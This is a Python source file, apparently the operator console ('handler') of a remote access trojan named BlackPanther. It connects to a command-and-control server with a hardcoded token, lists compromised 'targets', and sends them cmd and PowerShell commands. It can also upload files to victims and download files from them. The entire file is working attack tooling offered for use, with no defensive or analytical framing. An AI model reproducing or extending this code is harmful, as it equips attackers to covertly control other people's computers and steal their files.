import os
import json
import socketio
import requests
import colorama
import webbrowser

URL = "http://localhost:9411" # !!!!! origin
TOKEN = "287310-3990727-82379923-398782" # !!!!! server token
   
if TOKEN == "": 
    print("Error server token in valid")
    exit()
# connecting to server
try:
    socket = socketio.Client()
    socket.connect(URL, wait_timeout=10)
except:
    print(f"{colorama.Fore.RED}socket server connection error. check the server is running or sleeping. run [npm run start]{colorama.Style.RESET_ALL}")
    exit()

def bootInterface():
    webbrowser.open_new(URL)

targets = {}

def targetHelp():
    print(f"""{colorama.Fore.CYAN}=== Target MENU ==={colorama.Style.RESET_ALL}
> shellinfo                  history commnad results.
> cmd                        cmd application.
> powershell                 powershell application.
> upload url@filename        upload files to the target.
> download filename          download files from target.
> - help                     show payload commnads.

> back                       to go back.
> help                       help menu.
""")


def help():
    print(f"""{colorama.Fore.CYAN}=== MENU ==={colorama.Style.RESET_ALL}
> interface   boot interface
> stop        stop the server
> targets     show all targets
> goto <id>   go into the target
> help        help menu
> ^C          exit 
""")
    
def setCommand(target, application, command: str):
    try:
        obj = {
            "application": application,
            "command": "",
            "filename": "uploaded_file"
        }

        if command.find("@") != -1:
            command = command.split("@")
            obj["command"] = command[0]
            obj["filename"] = command[1]
        else:
            obj["command"] = command

        res = requests.post(URL + "/terminal?id="+target, obj, cookies={"token": TOKEN})
        if res.status_code != 200: 
            print(f"{colorama.Fore.RED}Requests Error.{colorama.Style.RESET_ALL}")
    except Exception as e:
        print(f"{colorama.Fore.RED}ERROR.{e}{colorama.Style.RESET_ALL}")
    
def getTargets(show):
    try:
        res = requests.get(URL + "/terminal", cookies={"token": TOKEN})

        if res.status_code == 200:
            data = json.loads(res.text)

            if len(data) == 0:
                if show: print(f"{colorama.Fore.RED}No Targets Found.{colorama.Style.RESET_ALL}")
            else:
                if show: print(f"{colorama.Fore.BLUE}ID Target's{colorama.Style.RESET_ALL}\n")
                for index, target in enumerate(data):
                    if show: print(f"{index}. {target}")
                    targets[index] = target
        else:   
            print(f"{colorama.Fore.RED}Requests Error.{colorama.Style.RESET_ALL}")
    except Exception as e:
        print(f"{colorama.Fore.RED}Requests Error.{e}{colorama.Style.RESET_ALL}")

def goto(id):
    try:
        target = targets[int(id)]
    except:
        print("ID NOT FOUND.")
        return
    
    message = True
    
    @socket.on(target)
    def sockResponse(data):
        if message:
            print(f"\n{colorama.Fore.GREEN}{data}{colorama.Style.RESET_ALL}")

    while True:
        userInput = input(f"[{target}]> ")
            
        if userInput == "back":
            message = False
            break

        elif userInput == "help":
            targetHelp()

        elif len(userInput) == 0 or userInput == "":
            continue

        elif userInput == "shellinfo":
            try: 
                data = requests.get(f"{URL}/ssd/uploads/{target}/SHELL.txt", cookies={"token": TOKEN}).text
                print(f"{colorama.Fore.GREEN}\n{data}\n{colorama.Style.RESET_ALL}")
            except: 
                print(f"{colorama.Fore.RED}shellinfo : Requests Error.{colorama.Style.RESET_ALL}")

        elif userInput[0:3] == "cmd":
            while True:
                cmd = input(f"[{target}/CMD]> ")

                if cmd == "back": break
                if len(cmd) > 0:
                    setCommand(target, "cmd", cmd)
        
        elif userInput[0:10] == "powershell":
            while True:
                cmd = input(f"[{target}/POWERSHELL]> ")
                
                if cmd == "back": break
                if len(cmd) > 0:
                    setCommand(target, "powershell", cmd)

        elif userInput[0:7] == "upload ":
            setCommand(target, "upload", userInput[7:])

        elif userInput[0:9] == "download ":
            setCommand(target, "download", userInput[9:])
        
        elif userInput[0:2] == "- ":
            setCommand(target, "-", userInput[2:])
        
        else: print(f"{colorama.Fore.RED}Invalid commnad try help.{colorama.Style.RESET_ALL}")
    
print(f"""{colorama.Fore.RED}
 ▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██ ▄█▀ ██▓███   ▄▄▄       ███▄    █ ▄▄▄█████▓ ██░ ██ ▓█████  ██▀███  
▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█   ██▄█▒ ▓██░  ██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▓██ ▒ ██▒
▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▓██░ ██▓▒▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██▀▀██░▒███   ▓██ ░▄█ ▒
▒██░█▀  ▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒██▄█▓▒ ▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▒██▀▀█▄  
░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄▒██▒ ░  ░ ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░▓█▒░██▓░▒████▒░██▓ ▒██▒
░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░
▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░░▒ ░       ▒   ▒▒ ░░ ░░   ░ ▒░    ░     ▒ ░▒░ ░ ░ ░  ░  ░▒ ░ ▒░
 ░    ░   ░ ░    ░   ▒   ░        ░ ░░ ░ ░░         ░   ▒      ░   ░ ░   ░       ░  ░░ ░   ░     ░░   ░ 
 ░          ░  ░     ░  ░░ ░      ░  ░                  ░  ░         ░           ░  ░  ░   ░  ░   ░     
      ░                  ░                                                           [HANDLER]                   
                                                                                    {colorama.Fore.GREEN} - Designed by madhan{colorama.Style.RESET_ALL}
                                                                                    {colorama.Fore.GREEN} - https://github.com/madhanmaaz{colorama.Style.RESET_ALL}
                                                                                    {colorama.Fore.GREEN} - https://madhanmaaz.netlify.app{colorama.Style.RESET_ALL}
""")

getTargets(False)
while True:
    try:
        userInput = input("> ")
    
        if len(userInput) == 0:
            continue

        elif userInput == "exit":
            socket.disconnect()
            print(requests.get(URL+"/close").text)
            exit()

        elif userInput == "help":
            help()

        elif userInput == "stop":
            socket.disconnect()
            print(requests.get(URL+"/close").text)
            exit()

        elif userInput == "interface":
            bootInterface()

        elif userInput == "targets":
            getTargets(True)

        elif userInput[0:5] == "goto ":
            goto(userInput[5:])

        else:
            print(f"{colorama.Fore.RED}Enter Valid Command.{colorama.Style.RESET_ALL}")

    except KeyboardInterrupt:
        socket.disconnect()
        exit()
        